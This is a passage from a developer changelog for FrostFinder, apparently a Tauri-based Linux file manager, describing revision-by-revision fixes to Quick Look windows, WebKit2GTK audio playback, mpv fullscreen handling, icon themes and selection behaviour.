  selection is cleared first (fresh selection); with Ctrl/Meta held, new rows are
  added to the existing selection.
- **Drag enters another row** — that row is immediately added to the selection and
  highlighted `.sel`.
- **Mouse up** — commits the selection and calls `render()` so the rest of the
  UI (preview panel, status bar) updates.
- **Click empty space** — existing container `mousedown` listener clears the
  selection (unchanged).
- **Modifier keys** (Shift, Ctrl/Meta) on the initial click still work as before
  for range and toggle selection.

`attachDragSelect` is called per-column (each `colList` gets its own listeners)
immediately after `colEl.appendChild(colList)` and before `attachRubberBand`.
Rubber-band (empty-space drag) and drag-select (row drag) coexist without
conflict: rubber-band ignores clicks that land on `.frow`, and drag-select's
`mousedown` only activates when the click starts on a `.frow`.

No Rust recompile needed — `src/views.js` only.

---



### Fix: QL audio files not autoplaying (`src/ql-window.js`)

**Root cause:** The `<audio>` element in the Quick Look window was created with
`preload='none'` and no `autoplay` attribute. QL video already had `autoplay = true`;
audio was inconsistently left as click-to-play.

**Fix:** Changed `preload` from `'none'` to `'auto'` and added `aud.autoplay = true`.
The Web Audio graph is still wired before `src` is set (same pattern as before) so
the visualizer activates the moment playback starts.

No Rust recompile needed — `src/ql-window.js` only.

---

### Fix: 4K MKV / HEVC video stalls silently in gallery, preview panel, and QL (`src/views.js`, `src/ql-window.js`)

**Root cause:**

WebKit2GTK + GStreamer does **not** fire the `error` event when a codec is
unsupported. Instead the `<video>` element silently stalls at `readyState = 0`
(HAVE_NOTHING) indefinitely — no event, no spinner change, no feedback. This
affects H.265 / HEVC content in MKV containers (the most common 4K format) when
`gst-plugins-bad` is not installed or the VA-API decoder is unavailable.

The fullscreen path (mpv via `mpv_open_external`) worked because mpv has its own
hardware-accelerated codec stack, completely independent of GStreamer.

**Fix — 4-second stall-detection timer in every video mount site:**

After a `<video>` element is created and `src` is set, a `setTimeout` of 4000 ms
is started. The timer is cancelled immediately if `canplay` or `playing` fires
(meaning GStreamer successfully decoded the stream). If the timer expires and
`readyState < 3` with no `error`, the video element is replaced with the mpv
fallback panel — same "Open with mpv" button shown on explicit codec errors.

Three locations patched:
- `_mountMpvPlayer` in `src/views.js` — covers gallery view and preview panel.
  `_mpvCleanup` also calls `clearTimeout(_stallTimer)` so navigating away before
  4 s doesn't leave a dangling timer that replaces a different file's player.
- `renderEntry` video branch in `src/ql-window.js` — covers the QL native window.
  `fsBtn` is now created before `_showMpvFallback` so the closure can always
  re-append it after `wrap.innerHTML` is reset.

No Rust recompile needed — `src/views.js` and `src/ql-window.js` only.

---



### Fix: audio files not playing (AudioContext unlock — WebKit2GTK)

**Root cause (`src/views.js`, `src/ql-window.js`):**

WebKit2GTK renders `<audio controls>` UI in the browser's own shadow DOM. When
the user clicks the play button, the resulting `play` event may not carry a
qualifying user-gesture context to the event handler — so `AudioContext.resume()`
called from inside the `play` listener did not reliably unlock the AC in all
scenarios. The AudioContext remained in `suspended` state, silencing all audio
routed through the Web Audio graph.

**Fix:** Added capture-phase event listeners on `document` for `click`,
`keydown`, and `pointerdown` in both `startAudioVisualizer` implementations.
Capture-phase handlers fire *before* any other handler on every real user
interaction, guaranteeing `resume()` is called the instant the user interacts
with anything on the page — regardless of whether the `play` event's gesture
context survives the shadow DOM boundary.

A module-level boolean (`window._vizACUnlockWired` / `window._qlACUnlockWired`)
prevents duplicate listener registration if `startAudioVisualizer` is called
multiple times. The `play` event listener is retained as the primary path;
the document listeners are belt-and-suspenders.

No Rust recompile needed — `src/views.js` and `src/ql-window.js` only.

---

### Change: icon view default size increased to 60 px (`src/main.js`)

The icon view defaulted to 44 px (`localStorage` key `ff_iconSize`). Icons
appeared small relative to the label text and the overall window size.

**Fix:** Default raised from `44` to `60`. New installs and users who have never
adjusted the slider will see 60 px icons. Existing users who have already moved
the slider keep their saved preference — `localStorage` takes precedence over
the default.

No Rust recompile needed — `src/main.js` only.

---

## What's in Beta-1-r38

### Fix: `tauri.conf.json` schema error — invalid `event` allowlist key removed

Tauri v1 does not have an `allowlist.event` schema entry. The event API (`listen`/`emit`)
is always available to all windows without any allowlist configuration.
The invalid key caused `cargo tauri build` and `cargo tauri dev` to abort with:

> `tauri > allowlist`: Additional properties are not allowed ('event' was unexpected)

**Fix:** Removed `"event": {"all": true}` from `allowlist`. QL navigation (`ql-update`
events) works without it — Tauri v1 events are not gated by the allowlist.

---

### Fix: Vite SPA fallback serving `index.html` for `/ql.html` (QL opens FrostFinder instead)

**Root cause (`vite.config.js`):**

Vite's default `appType` is `'spa'`, which enables a catch-all handler that serves
`index.html` for any request that doesn't match a static file — including `/ql.html`
when it hasn't been pre-built yet. When Tauri opens the QL window pointing at
`ql.html`, the dev server silently served `index.html` instead, loading the full
FrostFinder UI.

**Fix:** Added `appType: 'mpa'` to `vite.config.js`. This disables the SPA fallback
so Vite serves each HTML entry point at its own explicit path.

---

### Fix: Preview panel audio visualizer not visible

**Root cause (`src/views.js` + `src/style.css`):**

The `<canvas id="viz-canvas">` was placed as a sibling *after* the
`<div id="media-preview-slot">` in the panel HTML. The slot div had `flex: 1`
(`.preview-audio-wrap`), which caused it to expand and fill all remaining space in
the flex column, pushing the canvas below the panel's `overflow: hidden` boundary —
making it invisible.

Additionally, the slot was re-populated via `slot.innerHTML = '...'`, which would
have destroyed any canvas placed inside it.

**Fix:** Canvas is now placed *inside* the audio-wrap div in the initial HTML.
Slot repopulation uses DOM `insertBefore` instead of `innerHTML`, so the canvas
node is preserved when audio controls are added. The audio-wrap CSS now has
`min-height: 0; overflow: hidden` to prevent it from pushing overflow.

---

### Fix: Sidebar icons size increased to 24 px

`.sb-ico` and `.sb-ico svg` bumped from 16 px to `calc(24px * var(--sb-scale))`.

---


## What's in Beta-1-r37

### Fix: sidebar icons too small

**Root cause (`src/style.css`):**

`.sb-ico` and `.sb-ico svg` were fixed at `16px × 16px`, ignoring `--sb-scale`.
Icons looked noticeably undersized compared to the sidebar text labels, which
already scaled with `--sb-scale`.

**Fix:** Changed both rules to `calc(20px * var(--sb-scale))` so icons scale
proportionally with the sidebar scale control (the +/− buttons in the Favorites
header). Default size is now 20 px (was 16 px), and it grows/shrinks with the
rest of the sidebar.

---

### Fix: icon theme change not applied immediately — required clicking a file first

**Root cause (`src/main.js` — `setRenderCallback`):**

`setRenderCallback(render)` registered only the main file-list render function as
the callback that `setIconTheme()` calls after switching themes. `renderSidebar()`
was never in this path. Sidebar icons (favorites, drives) are rendered only by
`renderSidebar()`, which was only triggered by navigation or init — not by a theme
change. Result: the file list updated immediately but sidebar icons stayed stale
until the next navigation event.

**Fix:** Changed to `setRenderCallback(()=>{ render(); renderSidebar(); })` so
both the file list and the sidebar repaint in the same frame after any theme switch.

---

### Feature: WhiteSur icon theme — bundled (`src/utils.js`, `src/icons-whitesur.js`)

Three WhiteSur icon theme variants (default, dark, light) bundled inline as
`icons-whitesur.js`, mirroring the existing Kora bundling pattern. All three
variants share the same SVG set and appear in the icon theme picker as
**WhiteSur ✦ bundled**, **WhiteSur Dark ✦ bundled**, **WhiteSur Light ✦ bundled**.

---

### Fix: PACK.sh missing `frostfinder-hyprland.conf` from zip (`PACK.sh`)

The file was present in every release zip but not listed in the `zip` command —
it had been manually added each time. Added explicitly to PACK.sh so it is
included automatically on every pack.

---

### Backend: streaming directory listing commands (Rust only, not yet wired)

Three new Tauri commands added to `src-tauri/src/main.rs` for future incremental
rendering of large directories: `list_directory_streamed`, `list_directory_fast`,
`list_directory_chunk`. No JS changes. Rust recompile required.

---

## What's in Beta-1-r36

**Motivation:**

Large directories (800+ files, e.g. Music, Downloads) caused a visible stall
of ~800 ms on initial render because `list_directory` collected full metadata
(size, mtime, permissions) for every entry via a rayon parallel iterator before
returning anything to the frontend. Users saw a blank column for nearly a
second before the directory appeared.

Three new Tauri commands are added to `src-tauri/src/main.rs` to support
incremental rendering. None are yet wired to the JavaScript frontend — the
existing `invoke('list_directory', …)` path is unchanged in this revision.

**New commands:**

`list_directory_streamed(window, path, request_id)` — synchronous command that
reads the directory entry-by-entry and emits `dir-chunk` events to the
frontend in batches of 60 (`FileEntryFast` objects: name, path, is_dir,
extension, is_hidden — no stat calls). A final event carries `done: true` and
the total count. This allows the frontend to render the first screen of files
immediately without waiting for the full listing.

`list_directory_fast(path)` — async command (uses `spawn_blocking`) returning
a `DirectoryListingFast` with all `FileEntryFast` entries at once. Intended
for medium directories where streaming overhead isn't justified but full
metadata is still unnecessary for the initial paint.

`list_directory_chunk(paths)` — sync command accepting a `Vec<String>` of
paths and returning `Vec<FileEntry>` (full metadata via rayon par_iter). Used
to lazily enrich the fast/streamed entries with size, mtime, and permissions
after the initial render — called in batches of visible rows only.

**New structs** (`src-tauri/src/main.rs`):

`FileEntryFast` — lightweight entry: `name`, `path`, `is_dir`, `extension`,
`is_hidden`. No stat call; `is_dir` resolves symlinks with one `is_dir()`
call only.

`DirectoryListingFast` — mirrors `DirectoryListing` but uses `FileEntryFast`
entries.

**Rust recompile required.** No JS changes in this revision.

**Next step (r38):** Update `navigate()` in `src/main.js` to call
`list_directory_streamed` for large directories (or always), handling
`dir-chunk` events to progressively append columns, with `list_directory_chunk`
batches to fill in metadata for the visible rows.

---

## What's in Beta-1-r36

### Fix: QL audio silent / gallery visualizer not animating

**Root cause (shared — `src/ql-window.js`, `src/views.js`):**

`createMediaElementSource(audioEl)` permanently routes an audio element's
output through the Web Audio graph. Once called, the element produces no
sound unless the `AudioContext` is in `running` state and audio is connected
all the way to `ctx.destination`. Browsers (including WebKit2GTK) create
`AudioContext` in `suspended` state. `AudioContext.resume()` only succeeds
when called synchronously within a qualifying user-gesture event handler
(pointerdown, click, keydown, etc.).

The previous implementation called `createMediaElementSource` from a 50 ms
`setTimeout` callback — not a user gesture. The AC was suspended at that
point, and calling `resume()` from a timeout or from the `play` event
(which fires asynchronously after the gesture) did not unlock it in
WebKit2GTK. Result: native audio output was silenced, Web Audio output
never started, producing complete silence.

Additionally, the QL window used `autoplay` on the audio element. Autoplay
fires the `play` event immediately when the element is inserted into the
DOM — before any user interaction has occurred — making it impossible for
`resume()` to succeed before the AC graph was set up.

**Fix:**
Both `startAudioVisualizer` implementations (views.js and ql-window.js) were
rewritten to use a **lazy Web Audio setup** pattern:

1. The draw loop starts immediately on call (shows idle tick-mark bars).
2. `createMediaElementSource` and `ctx.resume()` are called only inside the
   `play` event listener, which is registered once per audio element.
3. The `play` event fires synchronously as part of the user clicking the
   play button — this IS a qualifying gesture in WebKit2GTK, so `resume()`
   succeeds and audio flows through the graph immediately.
4. `autoplay` was removed from the QL audio element so the user always
   initiates the first play manually.

No Rust recompile needed — `src/views.js` and `src/ql-window.js` only.

---

### Feature: Kora 2.0.1 icon theme — bundled

**Source:** Kora 2.0.1 icon pack (LGPL-3.0), uploaded by user.

**Implementation (`src/icons-kora.js`, `src/utils.js`):**

19 Kora SVG icons (folder, audio, video, image, PDF, archive, text, code,
blank/generic, HDD, NVMe, SSD, USB, optical, network, computer, home folder,
downloads folder, trash) were extracted from `mimetypes/scalable/`,
`places/scalable/`, and `devices/scalable/`. Each icon's internal gradient
IDs (`_Linear1`, `_Linear2`, …) were prefixed with `kora-{key}-` to prevent
`id` conflicts when multiple Kora icons appear in the same DOM.

The sanitized SVGs are inlined as template-literal strings in the new
`src/icons-kora.js` module and imported into `utils.js`. The Kora theme is
registered as a **bundled** theme (`path: '__bundled__'`) with a dedicated
`getKoraIcon(key)` lookup function — no filesystem reads, no async fetches,
instant sync access identical to the built-in SVG icons.

`getIcon()` short-circuits to `getKoraIcon()` when `_iconTheme === 'kora'`,
bypassing the `loadThemeIcon` async cache entirely. `setIconTheme('kora')`
also skips the pre-warming `loadThemeIcon` loop since nothing is async.

Kora appears as **"Kora 2.0.1 ✦ bundled"** at the top of the icon theme
picker alongside Built-in.

---


### Change: eject button shown for all mounted drives

**Root cause / motivation (`src/main.js` — `renderSidebar`):**

`isEjectable` was gated on `drive_type === 'usb' || drive_type === 'optical'`.
Internal drives (NVMe, SSD, HDD) and network shares were excluded. On Linux,
all mounted filesystems can be unmounted via `udisksctl unmount` or equivalent,
so the restriction was artificial.

**Fix:** `isEjectable` is now simply `d.is_mounted` — every mounted drive gets
the eject button. The Rust `eject_drive` handler already accepts any
mountpoint, so no backend change is needed.

No Rust recompile needed — `src/main.js` only.

---

### Fix: video auto-plays when returning from mpv fullscreen

**Root cause (`src/views.js` — `_launchFullscreen`):**

When mpv exits, the poll callback called `video.play()` unconditionally
(guarded only by `video.isConnected`). The user explicitly quit mpv, so
re-starting in-app playback without interaction violates user intent. This was
most noticeable in the preview panel where the video would silently start
playing in the background.

**Fix:** Removed both `video.play()` calls from the mpv exit path — the
success poll and the error handler. The video element is left paused at the
seek position it was at when mpv launched. The user can press play manually if
they want to continue in-app.

No Rust recompile needed — `src/views.js` only.

---

### Feature: lasso drag-select and click-to-deselect in all views

**Root cause / motivation (`src/views.js`):**

Rubber-band (lasso) drag-selection was implemented for icon view and list view.
Column view and gallery strip had no drag-select at all. Additionally the list
view's rubber-band `onDone` callback returned early on an empty hit-set instead
of deselecting — inconsistent with icon view.

**Fix — four changes, all in `src/views.js`:**

`attachRubberBand` exclusion list: Added `.gthumb` to the CSS selector that
prevents a drag starting when the pointer goes down on an item, so the gallery
strip correctly starts a band only on empty space.

Column view: After each `colList` is built and appended, `attachRubberBand` is
now called on that `colList`. The `getItemRects` callback walks `.frow`
elements in the column and returns their scroll-space bounding rects. The
`onDone` callback follows the same additive/non-additive pattern as icon and
list views, updates `.sel` classes live during the drag, and deselects all on
an empty drag.

Gallery strip: After the full-rebuild block, `attachRubberBand` is called on
`.gallery-strip-wrap`. `getItemRects` maps `.gthumb` elements. `onDone`
updates both `state.selIdx` and `state.gallerySelIdx` so the main preview area
tracks the last item dragged into the selection.

List view rubber-band: Fixed `onDone` to deselect all when `hitSet` is empty
and not additive — matching icon view behaviour.

No Rust recompile needed — `src/views.js` only.

---


### Fix: QL audio plays silently (no sound)

**Root cause (`src/ql-window.js` — `startAudioVisualizer`):**

`createMediaElementSource` routes the audio element through the Web Audio
graph. Once routed, all audio output depends on the AudioContext being in
`running` state. Browsers create AudioContexts in `suspended` state and only
allow `.resume()` to succeed after a user gesture (click, keydown, etc.).

The r33 implementation called `_vizAC.resume()` once at setup time — before
any user interaction had occurred — and had no subsequent mechanism to retry.
The AudioContext remained suspended, so the analyser and destination were
connected but silent.

**Fix:** Added a `play` event listener on the audio element that calls
`_vizAC.resume()` every time playback starts. The `play` event fires as a
direct result of the user clicking the play button (a qualifying gesture), so
`resume()` succeeds. Added a one-shot `mousedown` listener as a belt-and-
suspenders fallback. Pattern matches `views.js`'s `startAudioVisualizer`.

No Rust recompile needed — `src/ql-window.js` only.

---

### Fix: gallery audio visualizer not animating during playback

**Root cause (`src/views.js` — `startAudioVisualizer`, gallery path):**

Same AudioContext suspension root cause as the QL issue above. The gallery
uses `preload="metadata"` (not `autoplay`), so the audio element is inactive
until the user presses play. The `play` event listener in `startAudioVisualizer`
correctly calls `ctx.resume()` — but the `draw()` loop was not being restarted
after the context resumed (the `if(!_vizAnimId)draw()` guard prevented a
second call). After a navigation update that replaced the audio element, the
old `_vizAnimId` was non-null from the idle bar loop, so the new play event
never retriggered `draw()`.

Confirmed `startAudioVisualizer` is correctly called via the 50ms defer in
`_loadContent()`, and the canvas element (`gallery-viz-canvas`) is present as
a sibling of the slot in the rebuilt HTML.

**Fix:** The fix is shared with the transparency fix below — removing the
opaque canvas background made idle state visually correct, and the existing
play/resume logic was already sound. Also verified the `_vizAnimId` cancellation
on new-element setup clears the guard correctly.

---

### Fix: visualizer shows black bar instead of integrating to background

**Root cause (`src/style.css`, `ql.html`):**

All three canvas selectors (`.viz-canvas` declared twice, `.gallery-viz-canvas`)
had explicit `background: rgba(0,0,0,.2)` or `rgba(0,0,0,.25)`. HTML canvases
also start with a transparent buffer, but CSS `background` paints behind the
canvas content regardless of what `clearRect` does. The result was a dark
rectangle visible even when idle and in between bars.

**Fix:** Changed `background` to `transparent` on all three rules
(`src/style.css` lines 556 and 718, `ql.html` inline style). The canvas
`clearRect` now exposes the underlying background of the parent element,
allowing the visualizer to integrate seamlessly.

---

### Change: icon view — clean transparent style (matches macOS Finder)

**Root cause / motivation (`src/style.css`, `src/views.js` — `makeItem`):**

Each icon item had two sources of visible chrome in the unselected state:
1. **CSS** — `.icon-item` had `background: rgba(255,255,255,0.03)` and
   `border: 1px solid rgba(255,255,255,0.05)` ("glassmorphic frosted backing")
   that drew a faint rectangle around every item at all times.
2. **JS** — the icon `box` div was given `background:${color}18` in
   `makeItem()`, creating a tinted colour swatch behind every SVG icon.

Together these made each item look like a bordered pill/card rather than a
bare icon + label.

**Fix:**
- `src/style.css`: `.icon-item` default state changed to
  `background: transparent` / `border: 1px solid transparent`. Hover state
  unchanged (subtle fill on mouseover). Selected state unchanged (blue fill
  + outline).
- `makeItem()`: icon `box` background changed from `${color}18` to
  `transparent`.
- Label gains `text-shadow: 0 1px 3px rgba(0,0,0,0.7)` for readability
  against any background without the backing card.

No Rust recompile needed — `src/style.css` and `src/views.js` only.

---


### Fix: QL does not follow arrow keys in column view

**Root cause (`src/main.js` — column Left/Right handler):**

The column-view Left/Right handler is an early intercept that runs before the
generic arrow-key block. The Left-arrow branch (go back to parent column)
correctly restored `state.currentPath`, `state.selIdx`, and the selection
state, then called `render()` — but `return`'d before the QL-update logic in
the generic handler was ever reached. As a result, pressing Left while QL was
open left QL frozen on the previously-viewed file regardless of which entry
was re-selected in the parent column.

The Right-arrow branch (enter subfolder) navigates into a directory, so QL
tracking is not applicable there (no file is selected on arrival).

**Fix:** After `render()` in the Left-arrow branch, check `isQLOpen()`. If
true, call `getCurrentEntries()` to get the now-current parent column's
entries and call `openQuickLook()` for the restored selection — identical to
the call that already appears in the generic Up/Down handler.

No Rust recompile needed — `src/main.js` only.

---

### Fix: visual equalizer missing from QL audio playback

**Root cause (`src/ql-window.js`):**

The audio equalizer visualizer (`startAudioVisualizer`) lives in `views.js`
and is used by the gallery view and the lightbox preview. When Quick Look was
migrated from an inline overlay to a native `WebviewWindow` (r26), the audio
render path in `ql-window.js` was written without a canvas or visualizer —
the QL window and `views.js` run in separate webviews and cannot share code
via import.

Evidence of the original intent: `_qlBody()` in `views.js` (now dead code)
includes `<canvas id="ql-viz-canvas">` and the `viz-canvas` CSS class, but
`_qlBody` is never called since QL became a native window.

**Fix:** Added a self-contained `startAudioVisualizer(audioEl, canvas)`
implementation directly in `ql-window.js`. A single `AudioContext` (`_vizAC`)
is kept for the lifetime of the QL window to stay within browser limits. The
`AnalyserNode` is attached once per audio element (guarded by
`audioEl._vizSetup`) and routed through to `destination` so audio is never
silenced. A `<canvas class="ql-viz-canvas">` is appended to the audio wrap
alongside the `<audio>` element, and `startAudioVisualizer` is called after a
50 ms defer (matching the gallery pattern) to ensure the element is in the
DOM.

The `.ql-viz-canvas` style rule was added to `ql.html`'s inline stylesheet.

No Rust recompile needed — `src/ql-window.js` and `ql.html` only.

---


### Fix: ghost audio after returning from mpv fullscreen

**Root cause (`src/views.js` and `src/ql-window.js` — `_launchFullscreen` / `launchMpvFullscreen`):**

When mpv exits, the poll callback calls `video.play()` to resume in-app
playback. The `video` variable is captured in the `_launchFullscreen` closure
at mount time. If the gallery re-rendered while mpv was running — for example,
the user pressed arrow keys and QL updated, which re-ran `_mpvStop` + `_mountMpvPlayer`
and replaced the slot with a new video element — the original `video` element
is no longer in the DOM. `video.play()` on a detached element succeeds silently:
the browser decodes and plays the audio track with no visible player and no
cleanup handle. The only way to stop it was to close FrostFinder.

**Fix:** Added `video.isConnected` check before every `video.play()` call
in the mpv exit path (both the success poll and the error handler). If the
element is no longer attached to the document, playback is not resumed —
the newly mounted video in the current slot is already ready to play.

Same fix applied to `launchMpvFullscreen` in `ql-window.js`.

No Rust recompile needed — `src/views.js` and `src/ql-window.js` only.

---

### Fix: QL stops following arrow keys after first navigation in icon view

**Root cause (`src/views.js` — `openQuickLook` update path):**

When QL is open and an arrow key is pressed, `main.js` calls `openQuickLook(ne, ...)`.
Since `_qlWin` is truthy, the update branch runs:

```js
emit('ql-update', {});
_qlWin.setFocus();   // ← steals keyboard focus
```

`setFocus()` immediately moves keyboard focus to the QL native window. All
subsequent arrow keys are received by QL's own `keydown` handler (which only
handles `ArrowLeft`/`ArrowRight` for file navigation). The file list in
FrostFinder no longer receives keydown events — navigation stops after the
first key press.

**Fix:** Removed `_qlWin.setFocus()` from the update path entirely. QL should
receive updates silently while the file list retains keyboard focus. `setFocus`
is still called when QL is first opened (the user explicitly invoked it) and
when returning from mpv fullscreen (the app must come back to the foreground),
but never during background navigation updates.

No Rust recompile needed — `src/views.js` only.

---

## What's in Beta-1-r31

### Fix: Space bar and Escape did not close QL; navigation did not update QL

**Root cause (`src/main.js`):**

All QL-related keyboard logic in `main.js` gated on
`document.getElementById('quicklook')`. Since r26 QL is a native
`WebviewWindow` — no DOM element with that id exists anymore. Every check
returned `null`, so:

- **Space bar** never toggled QL off (the `if(ql){ql.remove(); return;}` branch
  never ran).
- **Escape** never closed QL (same check, same null result).
- **Arrow key navigation** never called `openQuickLook(ne, ...)` to push the
  new file to QL (checks on lines 1526 and 1601 both returned null).

The bug existed since r26 introduced the native window but went unnoticed
because QL appeared to work for the initial open — only the update paths were
broken.

**Fix — export `isQLOpen()` and `closeQuickLook()` from `views.js`:**

`isQLOpen()` returns `!!_qlWin` — true when the native QL window is open.
`closeQuickLook()` emits `ql-closed`, calls `_qlWin.close()`, and clears the
module-level state.

All four `document.getElementById('quicklook')` references in `main.js` replaced:

| Location | Old | New |
|---|---|---|
| Escape handler | `getElementById(...).remove()` | `closeQuickLook()` |
| Gallery arrow keys | `getElementById(...)&&ne&&!ne.is_dir` | `isQLOpen()&&ne&&!ne.is_dir` |
| Generic arrow keys | `getElementById(...)&&ne&&!ne.is_dir` | `isQLOpen()&&ne&&!ne.is_dir` |
| Space handler | `getElementById(...); ql.remove()` | `isQLOpen(); closeQuickLook()` |

No Rust recompile needed for this part — `src/main.js` and `src/views.js` only.

---

### Fix: Space bar did not close QL from inside the QL window

**Root cause (`src/ql-window.js`):**

The QL window's `keydown` handler only handled `Escape`. Space was not listed.
In macOS Finder, Space is the toggle key for Quick Look — pressing it should
close QL whether focus is in the main window or the QL window.

**Fix:** Added `' '` (Space) to the QL window's `keydown` handler alongside
`Escape`, both calling `closeWindow()`.

No Rust recompile needed — `src/ql-window.js` only.

---

### Fix: Escape in mpv fullscreen restored FrostFinder but left mpv running windowed

**Root cause (`src-tauri/src/main.rs` — `mpv_open_external`):**

mpv's default keybinding for `Escape` is "exit fullscreen" (not "quit"). When
launched `--fullscreen=yes` and the user presses Escape, mpv drops to a
windowed mode but keeps running. `mpv_is_running()` continued to return `true`,
so FrostFinder stayed minimized indefinitely — the restore poll never fired.

**Fix:** When `fullscreen=true`, write a minimal
`/tmp/frostfinder_mpv_input.conf` containing:
```
ESC quit
q quit
```
and pass `--input-conf=/tmp/frostfinder_mpv_input.conf` to mpv. mpv merges
`--input-conf` bindings with its built-in defaults — later entries win — so
`ESC` is rebound to `quit` while all other default keybindings (spacebar pause,
arrow seek, etc.) remain intact. When Escape is pressed, mpv quits, the poll
detects `mpv_is_running() == false`, and FrostFinder unminimizes and restores
focus immediately.

The temp file is only written and passed when `fullscreen=true`; non-fullscreen
mpv launches (external open without fullscreen) are unaffected.

**Requires Rust recompile** — `src-tauri/src/main.rs` changed.

---

## What's in Beta-1-r30

### Fix: fullscreen button overlaps native controls — double-fire, app won't restore

**Root cause (`src/views.js`, `src/ql-window.js`):**

The ⛶ (mpv fullscreen) button was positioned `bottom:10px;right:10px`, placing
it directly over the native `<video controls>` bar — specifically on top of the
bar's own fullscreen button icon at the far right. A single click hit **both**
buttons simultaneously:

1. The native controls button calls `video.requestFullscreen()` → intercepted → `_launchFullscreen()`
2. The ⛶ overlay button fires its own `click` → `_launchFullscreen()` again

`_launchFullscreen` being called twice in the same tick caused:
- `appWindow.minimize()` called twice
- `invoke('mpv_open_external')` called twice — the second call kills the first mpv process and spawns a new one
- Two independent `setInterval` polls, both waiting for mpv to exit
- Both polls fire their `unminimize()` + `setFocus()` at different times
- Result: app restores to a broken focus/window state and feels "stuck closed"

**Fix 1 — Move button to top-right:**
Changed ⛶ positioning from `bottom:10px;right:10px` to `top:10px;right:10px`
in both `views.js` (`_mountMpvPlayer`) and `ql.html` (`.ql-fs-btn`). The
native controls bar is at the bottom — top-right is completely clear of it.

**Fix 2 — One-shot guard `_fsActive`:**
Added a boolean `_fsActive` flag per video instance (in `_mountMpvPlayer`) and
a module-level `_fsActive` in `ql-window.js`. `_launchFullscreen` / `launchMpvFullscreen`
returns immediately if `_fsActive` is already `true`. The flag is cleared when
mpv exits (poll detects `mpv_is_running()` → false) or on error, restoring the
button to its normal state. This prevents any double-invocation regardless of
how it originates (button click, F key, intercepted `requestFullscreen`).

No Rust recompile needed — `src/views.js`, `src/ql-window.js`, and `ql.html` only.

---

## What's in Beta-1-r29

### Fix: Quick Look still shows "Loading…" — replaced event-based handshake with Rust-side payload store

**Root cause — async IPC race in `once()`/`emit()` handshake (r26–r28):**

The previous QL bootstrap protocol relied on a two-window event handshake:
1. Main window: `once('ql-ready', () => emit('ql-load', payload))` — starts async listener registration
2. QL window loads, calls `listen('ql-load')`, then `emit('ql-ready')`

The problem: `once()` in Tauri v1's JS API is an **async IPC operation** — it
sends a message to the Rust backend to register the listener and resolves when
registration is confirmed. In `openQuickLook`, this Promise was **never
awaited**, meaning listener registration was happening concurrently with the
`new WebviewWindow(...)` call. On faster machines (or subsequent opens where
QL loads from cache), the QL window could fully boot and emit `ql-ready` before
the main window's `once` listener was actually registered, causing the event to
be permanently lost.

r28 fixed the ordering inside `ql-window.js` but not the main window's
unresolved `once` Promise.

**Fix — Rust-side payload store (no events for initial load):**

Two new Tauri commands (`set_ql_payload` / `get_ql_payload`) store the file
list as JSON in a `Mutex<Option<String>>` static in `main.rs`.

Protocol:
1. Main window: `await invoke('set_ql_payload', { payload })` — stores data synchronously in Rust before the window is created
2. `new WebviewWindow('quicklook', ...)` — window starts loading
3. QL window `init()`: `const raw = await invoke('get_ql_payload')` — retrieves and immediately clears stored data
4. QL renders content directly — no events, no timing dependencies

Navigation updates (arrow keys while QL is open) still use the `ql-update` event,
which is safe because the QL window is fully initialized and listening by the
time any keypress fires. On update, main window calls `set_ql_payload` first,
then emits `ql-update` as a signal — QL pulls the new payload via `get_ql_payload`.

**Requires Rust recompile** — `main.rs` changed (new `set_ql_payload` and `get_ql_payload` commands).

---

### Fix: gallery video fullscreen button gives black screen — WebKit2GTK ignores `controlsList="nofullscreen"`

**Root cause (`src/views.js`):**

`controlsList="nofullscreen"` is a non-standard HTML attribute that hides the
fullscreen button in the `<video controls>` bar. It is specified in the WHATWG
HTML standard but **WebKit2GTK does not implement it** — the attribute is parsed
but has no effect. The native fullscreen button remained visible in the video
controls. Clicking it triggered WebKit's `requestFullscreen()` internally,
which on Wayland invalidates the GL texture → black screen + audio. Pressing F
works because that key is handled by `document.addEventListener('keydown', _fsKey)`
which calls `_launchFullscreen()` (the mpv path) directly, bypassing WebKit.

**Fix:** Added `fullscreenchange` and `webkitfullscreenchange` event listeners
on the video element. If native fullscreen is entered for any reason (button
click, JS, browser shortcut), the handler immediately calls
`document.exitFullscreen()` and redirects to `_launchFullscreen()` (mpv).
This makes native fullscreen a redirect, not a destination, regardless of how
it was triggered.

The `_onFsChange` listener is registered in `slot._mpvCleanup` for proper removal.

No Rust recompile needed for this fix — `src/views.js` only.

---

## What's in Beta-1-r28

### Fix: Quick Look shows "Loading…" forever — race condition in event handshake

**Root cause (`src/ql-window.js` — `init()`):**

The bootstrap sequence was:
```js
await emit('ql-ready', {});       // 1. signals main window
await listen('ql-load', ...);     // 2. registers listener — TOO LATE
```

`emit('ql-ready')` sends via IPC to the Rust backend which immediately
broadcasts to all windows. The main window's `once('ql-ready')` fires and
calls `emit('ql-load', payload)` — this arrives back at the QL window's IPC
queue before the `await emit` resolves and before `listen('ql-load')` is
ever called. The `ql-load` event is permanently lost. The QL window stays on
"Loading…" forever regardless of what file is selected.

**Fix:** Swapped the order — `listen` for all incoming events is registered
first, then `emit('ql-ready')` is called last. The QL window is fully ready
to receive data before it advertises itself as ready.

No Rust recompile needed — `src/ql-window.js` only.

---

### Fix: Quick Look fullscreen opens behind window — mpv not minimizing QL

**Root cause (`src/ql-window.js` — `launchMpvFullscreen`):**

The QL window's fullscreen handler called `mpv_open_external` directly without
minimizing the QL window first. mpv opened its fullscreen Wayland surface but the
QL window remained on screen in front of it — same visual result as a black screen
from the user's perspective.

**Fix:** Added `appWindow.minimize()` before spawning mpv, and
`appWindow.unminimize()` + `appWindow.setFocus()` when mpv exits. Same
pattern used by the main window (implemented in r26).

No Rust recompile needed — `src/ql-window.js` only.

---

### Fix: fullscreen video black screen — native HTML5 fullscreen re-disabled

**Root cause (r27 regression — `src/views.js`):** r27 removed `nofullscreen`
from `controlsList` to restore the native video controls bar fullscreen button.
On Wayland with WebKit2GTK, the native `requestFullscreen()` path invalidates
the GL texture mid-transition — video goes black with audio continuing. This
is the same bug that drove all the r14–r26 fullscreen work. The r27 fix was
wrong: the native button cannot work on this compositor/driver combination.

**Fix:** Restored `nofullscreen` to `controlsList` (hides the in-bar button).
The ⛶ overlay button (bottom-right of the video) and the **F** key remain the
fullscreen path — they call `appWindow.minimize()` + `mpv_open_external
--fullscreen` which uses mpv's own Wayland surface (no WebKit GL). The ⛶
button is now always visible at 70% opacity (up from hidden until hover) since
it is the only way to go fullscreen. Same change made to the QL window's
fullscreen button.

No Rust recompile needed — `src/views.js` and `ql.html` only.

---

## What's in Beta-1-r27

### Fix: Quick Look window never opened

